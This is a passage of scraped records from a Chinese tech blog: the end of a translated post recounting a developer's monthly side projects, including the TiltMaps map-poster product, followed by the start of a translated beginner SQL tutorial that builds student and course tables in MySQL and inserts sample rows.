Machine））。</p>\n<p>所以我为四月份的项目写了一个 JavaScript 库来探索 GOAP。一个基础执行简单得出乎意料（只要 58 行代码！）。</p>\n<p> </p>\n<h3>五月：<a href=\"https://github.com/wmdmark/goap-js\">目标合同</a></h3>\n<p><em>为你的目标签署责任合同。</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1frenq1hudmj20rs0iktbq.jpg\"></p>\n<p style=\"text-align: center;\">内嵌责任的目标合同</p>\n<p>五月我也开始了<a href=\"https://whole30.com/whole30-program-rules/\">整整 30 天节食（Whole 30 diet）</a>。我对我的饮食习惯变得满意，它也必然会影响我的能量级。整整 30 天节食（Whole30）对我来说进行得很顺利（节食期间我减了 18 磅，在接下来的几个月总共又减了 35 磅）。最重要的是，它确实均衡了我白天的能量，我感到更有动力了，也更专注了。</p>\n<p>看到了公开承诺和动力的相似之处，我决定将探索“目标合同”这个想法作为五月的副项目。</p>\n<p style=\"text-align: center;\">. . .</p>\n<h3>六月至十二月：<a href=\"https://www.tiltmaps.com\">TiltMaps</a></h3>\n<p><em>为你喜爱的地点和记忆制作独一无二的地图海报</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frenq23kdhj20rs0ib49c.jpg\"></p>\n<p style=\"text-align: center;\">TiltMaps 主页</p>\n<p>这是一切的核心。我六月份的目标是做一个大家真正想买的产品。我最大的短板之一就是销售和营销，所以我想做一个可以帮助我练习的产品来进一步学习。</p>\n<p>我一直都对地图和生成艺术感兴趣，所以我有个吸引人的主意——创造一个工具，你可以用它来创造并购买你所喜爱的地点的海报。</p>\n<p>这个项目太过有野心，不能在一个月内作为副项目完成。所以我决定用 2017 年剩余的几个月来完成 TiltMaps，并在发布前每个月都研究该产品的不同角度。我发现把一个较大的项目的不同部分分成月度项目能有效完成项目。</p>\n<p> </p>\n<h3>六月至七月：The Secret Sauce <sup>™</sup></h3>\n<p>为了弄清楚是否有可能生成高分辨率 3D 地图，我第一个月大部分时间都用来做 R&amp;D 了。生成世界上任意地点的一张 300dpi 的 3D 地图不是任意 API 或者我找到的平台能开箱即用地支持的事情，所以我不得不发明我自己的方法来完成这件事。弄清它花掉了我这个月大部分的时间，但是当我找到了答案就变得出乎意料地简单了。之后，我构建了一个基础编辑器来开始制作真正的海报，并订购了几次打印测试。</p>\n<p> </p>\n<h3>八月至九月：概念的证明（MVP）</h3>\n<p>接下来几个月我构建了该产品有更多消费者的 MVP。设计并不好，但是我还是让事情运转起来了，并且可以开始海报制作和打印的用户测试了。</p>\n<p> </p>\n<h3>十月至十一月：品牌和市场营销</h3>\n<p>接下来的几个月，我专注于让该项目准备好发布。尽管编辑器基本完成了，但是我还没有主页，而且市场营销方面还差得远。</p>\n<p>最终，通过在 Zero Day 和我参加的一个研讨会上展示 TiltMaps， 我在项目发布前的一个月卖出了几张海报。这非常鼓舞人心，因为这是我第一次从副项目中卖出了东西。</p>\n<p> </p>\n<h3>十二月：公开发布</h3>\n<p>在 <a href=\"https://www.producthunt.com/posts/tiltmaps\">Product Hunt</a> 上的发布比我预想中进行得顺利。我预计会卖出 10 张左右，但最终卖出了 37 张，而且仍然有订单进来。制作人们想买的东西感觉很好，而且它是一个很好的测试平台，可以尝试那些可能会在我的全职工作中发挥作用的、不同的广告和销售策略。</p>\n<p>我计划 2018 年继续致力于 TiltMaps。但愿我能从其中获得体面的、有趣的收入。</p>\n<p style=\"text-align: center;\">. . .</p>\n<p>总结完毕。感谢您读完全文。</p>\n<p>有任何想法或者反馈？我将洗耳恭听。在下面评论或者在 <a href=\"https://twitter.com/wmdmark\">Twitter</a> 上与我联络。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113822\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113822votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113822\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,副项目", "url": "http://blog.jobbole.com/113822/", "url_obj_id": "a477d68fdad1a1b384e0ae7fb5c03095"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/01/970c5be7812066919173f6ec5ab052ce.png"], "title": "SQL 入门", "create_date": "2018/04/14 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/2/getting-started-sql\">Aaron Cocker</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9537-1.html\">Linux中国/MjSeven</a>   </div><blockquote><p>使用 SQL 构建一个关系数据库比你想的更容易。</p></blockquote>\n<p>使用 SQL 构建数据库比大多数人想象得要简单。实际上，你甚至不需要成为一个有经验的程序员就可以使用 SQL 创建数据库。在本文中，我将解释如何使用 MySQL 5.6 来创建简单的关系型数据库管理系统（RDMS）。在开始之前，我想顺便感谢一下 <a href=\"http://sqlfiddle.com\">SQL Fiddle</a>，这是我用来运行脚本的工具。它提供了一个用于测试简单脚本的有用的沙箱。</p>\n<p>在本教程中，我将构建一个使用如下实体关系图（ERD）中显示的简单架构的数据库。数据库列出了学生和正在学习的课程。为了保持简单，我使用了两个实体（即表），只有一种关系和依赖。这两个实体称为 <code>dbo_students</code> 和 <code>dbo_courses</code>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/1281ca5e31c38cb7a7c9a46ad9a1ce04.png\" alt=\"\"></p>\n<p>数据库的多样性是一对多的，因为每门课程可以包含很多学生，但每个学生只能学习一门课程。</p>\n<p>关于术语的快速说明：</p>\n<ol>\n<li>一张表称为一个实体。</li>\n<li>一个字段称为一个属性。</li>\n<li>一条记录称为一个元组。</li>\n<li>用于构建数据库的脚本称为架构。</li>\n</ol>\n<h3 id=\"toc_1\">构建架构</h3>\n<p>要构建数据库，使用 <code>CREATE TABLE &lt;表名&gt; </code> 命令，然后定义每个字段的名称和数据类型。数据库使用 <code>VARCHAR(n)</code> （字符串）和 <code>INT(n)</code> （整数），其中 <code>n</code> 表示可以存储的值的长度。例如 <code>INT(2)</code> 可以是 <code>01</code>。</p>\n<p>这是用于创建两个表的代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f740041342945878\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE dbo_students\r\n(\r\n  student_id INT(2) AUTO_INCREMENT NOT NULL,\r\n  student_name VARCHAR(50),\r\n  course_studied INT(2),\r\n  PRIMARY KEY (student_id)\r\n);\r\n\r\nCREATE TABLE dbo_courses\r\n(\r\n  course_id INT(2) AUTO_INCREMENT NOT NULL,\r\n  course_name VARCHAR(30),\r\n  PRIMARY KEY (course_id)\r\n);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740041342945878-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740041342945878-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_students</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-2\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">student_id </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AUTO_INCREMENT </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">student_name </span><span class=\"crayon-e\">VARCHAR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_studied </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-9\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_courses</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-10\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_id </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AUTO_INCREMENT </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">course_name </span><span class=\"crayon-e\">VARCHAR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740041342945878-14\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740041342945878-15\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p><code>NOT NULL</code> 意味着字段不能为空，<code>AUTO_INCREMENT</code> 意味着当一个新的元组被添加时，ID 号将自动生成，是对先前存储的 ID 号加 1，以强化各实体之间的完整参照性。 <code>PRIMARY KEY</code> 是每个表的惟一标识符属性。这意味着每个元组都有自己的不同的标识。</p>\n<h3 id=\"toc_2\">关系作为一种约束</h3>\n<p>就目前来看，这两张表格是独立存在的，没有任何联系或关系。要连接它们，必须标识一个外键。在 <code>dbo_students</code> 中，外键是 <code>course_studied</code>，其来源在 <code>dbo_courses</code> 中，意味着该字段被引用。SQL 中的特定命令为 <code>CONSTRAINT</code>，并且将使用另一个名为 <code>ALTER TABLE</code> 的命令添加这种关系，这样即使在架构构建完毕后，也可以编辑表。</p>\n<p>以下代码将关系添加到数据库构造脚本中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f74004b638987212\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nALTER TABLE dbo_students\r\nADD CONSTRAINT FK_course_studied\r\nFOREIGN KEY (course_studied) REFERENCES dbo_courses(course_id);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74004b638987212-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74004b638987212-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f74004b638987212-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f74004b638987212-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f74004b638987212-1\"><span class=\"crayon-e\">ALTER </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">dbo_students</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74004b638987212-2\"><span class=\"crayon-e\">ADD </span><span class=\"crayon-e\">CONSTRAINT </span><span class=\"crayon-e\">FK_course_studied</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74004b638987212-3\"><span class=\"crayon-e\">FOREIGN </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">REFERENCES </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74004b638987212-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>使用 <code>CONSTRAINT</code> 命令实际上并不是必要的，但这是一个好习惯，因为它意味着约束可以被命名并且使维护更容易。现在数据库已经完成了，是时候添加一些数据了。</p>\n<h3 id=\"toc_3\">将数据添加到数据库</h3>\n<p><code>INSERT INTO &lt;表名&gt; </code> 是用于直接选择要添加哪些属性（即字段）数据的命令。首先声明实体名称，然后声明属性，下边是添加到实体的数据，从而创建一个元组。如果指定了 <code>NOT NULL</code>，这表示该属性不能留空。以下代码将展示如何向表中添加记录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a81f740050181242753\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(001,'Software Engineering');\r\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(002,'Computer Science');\r\nINSERT INTO dbo_courses(course_id,course_name)\r\nVALUES(003,'Computing');\r\n\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(001,'student1',001);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(002,'student2',002);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(003,'student3',002);\r\nINSERT INTO dbo_students(student_id,student_name,course_studied)\r\nVALUES(004,'student4',003);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a81f740050181242753-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a81f740050181242753-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-1\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-2\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Software Engineering'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-3\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-4\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Computer Science'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-5\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-6\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Computing'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-8\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f740050181242753-9\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f740050181242753-10\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span 